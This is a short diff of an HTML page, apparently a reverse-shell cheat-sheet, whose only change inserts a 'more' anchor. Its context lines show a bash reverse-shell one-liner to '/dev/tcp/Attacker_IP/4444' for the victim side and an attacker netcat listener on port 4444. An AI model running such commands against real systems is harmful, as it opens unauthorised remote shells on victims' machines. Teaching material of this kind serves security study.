@@ -8,7 +8,7 @@
 <p>​    Victimer：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i  &gt;&amp; /dev/tcp/Attacker_IP/4444  0&gt;&amp;1</span><br></pre></td></tr></table></figure>
 
-
+<a id="more"></a>
 
 <h3 id="Python："><a href="#Python：" class="headerlink" title="Python："></a>Python：</h3><p>​    Attacker：nc  -lvvp  4444</p>
 <p>​    Victimer：</p>
